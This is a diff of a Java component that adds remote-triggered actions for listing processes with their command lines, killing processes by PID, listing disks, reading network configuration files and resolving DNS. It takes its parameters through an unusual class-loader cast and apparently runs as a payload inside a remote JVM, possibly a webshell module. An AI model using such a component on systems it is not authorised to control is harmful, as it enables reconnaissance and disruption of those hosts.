@@ -1,6 +1,8 @@
 package org.leo.core.component;
 
 import java.io.File;
+import java.io.ByteArrayOutputStream;
+import java.io.FileInputStream;
 import java.lang.management.ManagementFactory;
 import java.lang.management.MemoryMXBean;
 import java.lang.management.RuntimeMXBean;
@@ -12,6 +14,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.HashMap;
+import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 
@@ -62,13 +65,16 @@ public class BasicInfoComponent implements Runnable {
     private ClassLoader currentThreadClassLoader;
 
     // 组件接口字段
+    private HashMap<String, Object> params;
     private HashMap<String, Object> results;
 
     
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
-            h.invoke(null, null, null);
+            Object rawParams = h.invoke(null, null, null);
+            params = rawParams instanceof HashMap
+                    ? (HashMap<String, Object>) rawParams : new HashMap<String, Object>();
             results = new java.util.HashMap<String, Object>();
             invoke();
         } catch (Throwable t) {
@@ -87,6 +93,66 @@ public class BasicInfoComponent implements Runnable {
      */
     public void invoke() {
         currentThreadClassLoader = Thread.currentThread().getContextClassLoader();
+        String action = params != null && params.get("action") != null
+                ? String.valueOf(params.get("action")) : "basic";
+        if ("processes".equals(action)) {
+            List<Map<String, Object>> processes = getProcessesInfo();
+            results.put("processes", processes);
+            results.put("total", Integer.valueOf(processes.size()));
+            results.put("source", processCollectionSource());
+            results.put("os", System.getProperty("os.name", ""));
+            results.put("code", Integer.valueOf(200));
+            return;
+        }
+        if ("killProcess".equals(action)) {
+            int pid = params.get("pid") instanceof Number
+                    ? ((Number) params.get("pid")).intValue() : -1;
+            boolean force = Boolean.TRUE.equals(params.get("force"));
+            Boolean terminated = terminateWithProcessHandle(pid, force);
+            results.put("handled", Boolean.valueOf(terminated != null));
+            results.put("terminated", Boolean.valueOf(Boolean.TRUE.equals(terminated)));
+            results.put("pid", Integer.valueOf(pid));
+            results.put("code", Integer.valueOf(terminated == null ? 501 : 200));
+            return;
+        }
+        if ("disks".equals(action)) {
+            List<Map<String, Object>> disks = getFileStoreInfo();
+            results.put("disks", disks);
+            results.put("total", Integer.valueOf(disks.size()));
+            results.put("source", "java-file-store");
+            results.put("os", System.getProperty("os.name", ""));
+            results.put("code", Integer.valueOf(200));
+            return;
+        }
+        if ("network".equals(action)) {
+            results.put("interfaces", getNetworkInfo());
+            results.put("os", System.getProperty("os.name", ""));
+            putFileIfPresent(results, "procArp", "/proc/net/arp", 64 * 1024);
+            putFileIfPresent(results, "procRoute", "/proc/net/route", 64 * 1024);
+            putFileIfPresent(results, "resolvConf", "/etc/resolv.conf", 64 * 1024);
+            putFileIfPresent(results, "hosts", isWindows()
+                    ? System.getenv("SystemRoot") + "\\System32\\drivers\\etc\\hosts"
+                    : "/etc/hosts", 128 * 1024);
+            results.put("code", Integer.valueOf(200));
+            return;
+        }
+        if ("resolveDns".equals(action)) {
+            String hostname = params.get("hostname") == null ? "" : String.valueOf(params.get("hostname"));
+            List<String> addresses = new ArrayList<String>();
+            if (hostname.length() > 0) {
+                try {
+                    InetAddress[] resolved = InetAddress.getAllByName(hostname);
+                    for (int i = 0; i < resolved.length; i++) addresses.add(resolved[i].getHostAddress());
+                } catch (Exception error) {
+                    results.put("msg", error.getMessage());
+                }
+            }
+            results.put("hostname", hostname);
+            results.put("addresses", addresses);
+            results.put("code", Integer.valueOf(hostname.length() == 0 ? 400
+                    : addresses.isEmpty() ? 404 : 200));
+            return;
+        }
         Map<String, Object> basicInfo = new HashMap<String, Object>();
         basicInfo.put("collectTime", Long.valueOf(System.currentTimeMillis()));
         basicInfo.put("HardwareInfo", getHardwareInfo());
@@ -302,40 +368,67 @@ public class BasicInfoComponent implements Runnable {
      * 获取文件系统信息
      */
     public List<Map<String, Object>> getFileSystemInfo() {
-        List<Map<String, Object>> fileSystemInfo = new ArrayList<Map<String, Object>>();
+        return getFileStoreInfo();
+    }
+
+    /** Java 7+ FileStore 反射路径，Java 6 自动回退 File.listRoots。 */
+    private List<Map<String, Object>> getFileStoreInfo() {
+        List<Map<String, Object>> stores = new ArrayList<Map<String, Object>>();
         try {
-            File[] roots = File.listRoots();
-            if (roots != null) {
-                for (int i = 0; i < roots.length; i++) {
-                    File root = roots[i];
-                    Map<String, Object> storeInfo = new HashMap<String, Object>();
-                    storeInfo.put("Name", root.getPath());
-                    storeInfo.put("Root", root.getPath());
-                    storeInfo.put("Type", "File System");
-
-                    // getTotalSpace/getUsableSpace 是 Java 1.6+，反射调用兼容 1.5
-                    long totalSpace = invokeFileSpaceMethod(root, "getTotalSpace");
-                    long usableSpace = invokeFileSpaceMethod(root, "getUsableSpace");
-
-                    if (totalSpace >= 0 && usableSpace >= 0) {
-                        long usedSpace = totalSpace - usableSpace;
-                        storeInfo.put("TotalSpaceMB", Long.valueOf(bytesToMB(totalSpace)));
-                        storeInfo.put("UsableSpaceMB", Long.valueOf(bytesToMB(usableSpace)));
-                        storeInfo.put("UsedSpaceMB", Long.valueOf(bytesToMB(usedSpace)));
-                        storeInfo.put("UsagePercent", Double.valueOf(calculateUsagePercent(usedSpace, totalSpace)));
-                    } else {
-                        storeInfo.put("note", "space info unavailable (Java < 1.6)");
-                    }
-
-                    fileSystemInfo.add(storeInfo);
-                }
+            Class<?> fileSystemsClass = Class.forName("java.nio.file.FileSystems");
+            Class<?> fileSystemClass = Class.forName("java.nio.file.FileSystem");
+            Object fileSystem = fileSystemsClass.getMethod("getDefault").invoke(null);
+            Object iterable = fileSystemClass.getMethod("getFileStores").invoke(fileSystem);
+            Iterator<?> iterator = ((Iterable<?>) iterable).iterator();
+            Class<?> fileStoreClass = Class.forName("java.nio.file.FileStore");
+            while (iterator.hasNext() && stores.size() < 256) {
+                Object store = iterator.next();
+                Map<String, Object> info = new HashMap<String, Object>();
+                String storeText = String.valueOf(store);
+                String mount = fileStoreMount(storeText);
+                String name = String.valueOf(fileStoreClass.getMethod("name").invoke(store));
+                String fsType = String.valueOf(fileStoreClass.getMethod("type").invoke(store));
+                info.put("mount", mount);
+                info.put("name", name);
+                info.put("fsType", fsType);
+                long total = ((Number) fileStoreClass.getMethod("getTotalSpace").invoke(store)).longValue();
+                long free = ((Number) fileStoreClass.getMethod("getUsableSpace").invoke(store)).longValue();
+                addSpaceInfo(info, total, free);
+                stores.add(info);
             }
-        } catch (Exception e) {
-            Map<String, Object> errorInfo = new HashMap<String, Object>();
-            errorInfo.put("error", "failed to get filesystem info: " + e.getMessage());
-            fileSystemInfo.add(errorInfo);
+        } catch (Throwable ignored) {
+            // Java 6 或受限运行时由 File.listRoots 路径接管。
         }
-        return fileSystemInfo;
+        if (!stores.isEmpty()) return stores;
+
+        File[] roots;
+        try { roots = File.listRoots(); } catch (Throwable ignored) { return stores; }
+        if (roots == null) return stores;
+        for (int i = 0; i < roots.length && stores.size() < 256; i++) {
+            File root = roots[i];
+            Map<String, Object> info = new HashMap<String, Object>();
+            info.put("mount", root.getPath());
+            info.put("name", root.getPath());
+            info.put("fsType", "File System");
+            long total = invokeFileSpaceMethod(root, "getTotalSpace");
+            long free = invokeFileSpaceMethod(root, "getUsableSpace");
+            addSpaceInfo(info, total, free);
+            stores.add(info);
+        }
+        return stores;
+    }
+
+    private void addSpaceInfo(Map<String, Object> info, long total, long free) {
+        if (total < 0L || free < 0L) return;
+        info.put("totalBytes", Long.valueOf(total));
+        info.put("freeBytes", Long.valueOf(free));
+    }
+
+    private String fileStoreMount(String storeText) {
+        if (storeText == null) return "";
+        String value = storeText.trim();
+        int suffix = value.lastIndexOf(" (");
+        return suffix > 0 ? value.substring(0, suffix).trim() : value;
     }
 
     /**
@@ -395,6 +488,224 @@ public class BasicInfoComponent implements Runnable {
             processInfo.put("error", "failed to get process info: " + e.getMessage());
         }
         return processInfo;
+    }
+
+    /** ProcessHandle → JNA → /proc，依次选择当前运行时可用路径。 */
+    private List<Map<String, Object>> getProcessesInfo() {
+        List<Map<String, Object>> processes = getProcessHandleProcesses();
+        if (!processes.isEmpty()) return processes;
+        processes = getJnaProcesses();
+        if (!processes.isEmpty()) return processes;
+        return getProcProcesses();
+    }
+
+    private String processCollectionSource() {
+        try {
+            Class.forName("java.lang.ProcessHandle");
+            return "ProcessHandle";
+        } catch (Throwable ignored) {
+            if (isWindows()) return "JNA";
+            return "/proc";
+        }
+    }
+
+    private List<Map<String, Object>> getProcessHandleProcesses() {
+        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
+        Object stream = null;
+        try {
+            Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
+            Class<?> infoClass = Class.forName("java.lang.ProcessHandle$Info");
+            Class<?> baseStreamClass = Class.forName("java.util.stream.BaseStream");
+            stream = handleClass.getMethod("allProcesses").invoke(null);
+            Iterator<?> iterator = (Iterator<?>) baseStreamClass.getMethod("iterator").invoke(stream);
+            while (iterator.hasNext() && processes.size() < 2000) {
+                Object handle = iterator.next();
+                Map<String, Object> process = new HashMap<String, Object>();
+                process.put("pid", handleClass.getMethod("pid").invoke(handle));
+                process.put("alive", handleClass.getMethod("isAlive").invoke(handle));
+                Object parent = optionalValue(handleClass.getMethod("parent").invoke(handle));
+                if (parent != null) process.put("ppid", handleClass.getMethod("pid").invoke(parent));
+                Object info = handleClass.getMethod("info").invoke(handle);
+                putOptional(process, "cmd", infoClass.getMethod("commandLine").invoke(info));
+                putOptional(process, "command", infoClass.getMethod("command").invoke(info));
+                putOptional(process, "user", infoClass.getMethod("user").invoke(info));
+                Object command = process.get("command");
+                process.put("name", command == null ? "" : new File(String.valueOf(command)).getName());
+                Object start = optionalValue(infoClass.getMethod("startInstant").invoke(info));
+                if (start != null) {
+                    process.put("startTime", start.getClass().getMethod("toEpochMilli").invoke(start));
+                }
+                Object cpu = optionalValue(infoClass.getMethod("totalCpuDuration").invoke(info));
+                if (cpu != null) process.put("cpuMillis", cpu.getClass().getMethod("toMillis").invoke(cpu));
+                processes.add(process);
+            }
+        } catch (Throwable ignored) {
+            processes.clear();
+        } finally {
+            if (stream != null) {
+                try { Class.forName("java.util.stream.BaseStream").getMethod("close").invoke(stream); }
+                catch (Throwable ignored) {}
+            }
+        }
+        return processes;
+    }
+
+    private Boolean terminateWithProcessHandle(int pid, boolean force) {
+        if (pid <= 0) return Boolean.FALSE;
+        try {
+            Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
+            Object optional = handleClass.getMethod("of", long.class).invoke(null, Long.valueOf(pid));
+            Object handle = optionalValue(optional);
+            if (handle == null) return Boolean.FALSE;
+            String method = force ? "destroyForcibly" : "destroy";
+            return (Boolean) handleClass.getMethod(method).invoke(handle);
+        } catch (Throwable ignored) {
+            return null;
+        }
+    }
+
+    private void putOptional(Map<String, Object> target, String key, Object optional) throws Exception {
+        Object value = optionalValue(optional);
+        if (value != null) target.put(key, value);
+    }
+
+    private Object optionalValue(Object optional) throws Exception {
+        if (optional == null) return null;
+        Boolean present = (Boolean) optional.getClass().getMethod("isPresent").invoke(optional);
+        return present.booleanValue() ? optional.getClass().getMethod("get").invoke(optional) : null;
+    }
+
+    /** Windows 可用 jna-platform 时走 EnumProcesses；其他环境自然落到 /proc。 */
+    private List<Map<String, Object>> getJnaProcesses() {
+        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
+        if (!isWindows()) return processes;
+        try {
+            Class<?> psapiClass = Class.forName("com.sun.jna.platform.win32.Psapi");
+            Class<?> kernelClass = Class.forName("com.sun.jna.platform.win32.Kernel32");
+            Class<?> intRefClass = Class.forName("com.sun.jna.ptr.IntByReference");
+            Object psapi = psapiClass.getField("INSTANCE").get(null);
+            Object kernel = kernelClass.getField("INSTANCE").get(null);
+            int[] pids = new int[4096];
+            Object needed = intRefClass.newInstance();
+            Method enumProcesses = findMethod(psapiClass, "EnumProcesses", 3);
+            enumProcesses.invoke(psapi, pids, Integer.valueOf(pids.length * 4), needed);
+            int count = ((Number) intRefClass.getMethod("getValue").invoke(needed)).intValue() / 4;
+            Method openProcess = findMethod(kernelClass, "OpenProcess", 3);
+            Method queryImage = findMethod(kernelClass, "QueryFullProcessImageName", 4);
+            Method closeHandle = findMethod(kernelClass, "CloseHandle", 1);
+            for (int i = 0; i < count && processes.size() < 2000; i++) {
+                if (pids[i] <= 0) continue;
+                Object handle = openProcess.invoke(kernel, Integer.valueOf(0x1000), Boolean.FALSE,
+                        Integer.valueOf(pids[i]));
+                if (handle == null) continue;
+                try {
+                    char[] path = new char[32768];
+                    Object length = intRefClass.getConstructor(int.class).newInstance(Integer.valueOf(path.length));
+                    Boolean ok = (Boolean) queryImage.invoke(kernel, handle, Integer.valueOf(0), path, length);
+                    if (!ok.booleanValue()) continue;
+                    int pathLength = ((Number) intRefClass.getMethod("getValue").invoke(length)).intValue();
+                    String command = new String(path, 0, pathLength);
+                    Map<String, Object> process = new HashMap<String, Object>();
+                    process.put("pid", Integer.valueOf(pids[i]));
+                    process.put("command", command);
+                    process.put("cmd", command);
+                    process.put("name", new File(command).getName());
+                    processes.add(process);
+                } finally {
+                    closeHandle.invoke(kernel, handle);
+                }
+            }
+        } catch (Throwable ignored) {
+            processes.clear();
+        }
+        return processes;
+    }
+
+    private Method findMethod(Class<?> type, String name, int parameterCount) throws NoSuchMethodException {
+        Method[] methods = type.getMethods();
+        for (int i = 0; i < methods.length; i++) {
+            if (name.equals(methods[i].getName())
+                    && methods[i].getParameterTypes().length == parameterCount) return methods[i];
+        }
+        throw new NoSuchMethodException(name);
+    }
+
+    private List<Map<String, Object>> getProcProcesses() {
+        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
+        File[] entries = new File("/proc").listFiles();
+        if (entries == null) return processes;
+        for (int i = 0; i < entries.length && processes.size() < 2000; i++) {
+            String name = entries[i].getName();
+            if (!isDigits(name)) continue;
+            String status = readTextFile(new File(entries[i], "status"), 64 * 1024);
+            if (status == null) continue;
+            Map<String, Object> process = new HashMap<String, Object>();
+            process.put("pid", Integer.valueOf(parseInt(name, -1)));
+            String[] lines = status.split("\\n");
+            for (int line = 0; line < lines.length; line++) {
+                int colon = lines[line].indexOf(':');
+                if (colon <= 0) continue;
+                String key = lines[line].substring(0, colon);
+                String value = lines[line].substring(colon + 1).trim();
+                if ("Name".equals(key)) process.put("name", value);
+                else if ("PPid".equals(key)) process.put("ppid", Integer.valueOf(parseInt(value, -1)));
+                else if ("Uid".equals(key)) process.put("user", value.split("\\s+")[0]);
+                else if ("VmRSS".equals(key)) process.put("memKb", Long.valueOf(parseLeadingLong(value)));
+            }
+            String cmdline = readTextFile(new File(entries[i], "cmdline"), 256 * 1024);
+            if (cmdline != null) process.put("cmd", cmdline.replace('\0', ' ').trim());
+            processes.add(process);
+        }
+        return processes;
+    }
+
+    private boolean isDigits(String value) {
+        if (value == null || value.length() == 0) return false;
+        for (int i = 0; i < value.length(); i++) if (!Character.isDigit(value.charAt(i))) return false;
+        return true;
+    }
+
+    private int parseInt(String value, int fallback) {
+        try { return Integer.parseInt(value.trim()); } catch (Exception ignored) { return fallback; }
+    }
+
+    private long parseLeadingLong(String value) {
+        if (value == null) return 0L;
+        String[] fields = value.trim().split("\\s+");
+        try { return Long.parseLong(fields[0]); } catch (Exception ignored) { return 0L; }
+    }
+
+    private void putFileIfPresent(Map<String, Object> target, String key, String path, int maxBytes) {
+        if (path == null || path.startsWith("null")) return;
+        String value = readTextFile(new File(path), maxBytes);
+        if (value != null && value.length() > 0) target.put(key, value);
+    }
+
+    private String readTextFile(File file, int maxBytes) {
+        if (file == null || !file.isFile()) return null;
+        FileInputStream input = null;
+        ByteArrayOutputStream output = new ByteArrayOutputStream();
+        try {
+            input = new FileInputStream(file);
+            byte[] buffer = new byte[4096];
+            int total = 0;
+            int read;
+            while ((read = input.read(buffer, 0, Math.min(buffer.length, maxBytes - total))) > 0) {
+                output.write(buffer, 0, read);
+                total += read;
+                if (total >= maxBytes) break;
+            }
+            return new String(output.toByteArray(), "UTF-8");
+        } catch (Throwable ignored) {
+            return null;
+        } finally {
+            if (input != null) try { input.close(); } catch (Throwable ignored) {}
+            try { output.close(); } catch (Throwable ignored) {}
+        }
+    }
+
+    private boolean isWindows() {
+        return System.getProperty("os.name", "").toLowerCase().indexOf("windows") >= 0;
     }
 
     // ==================== 反射辅助方法 ====================
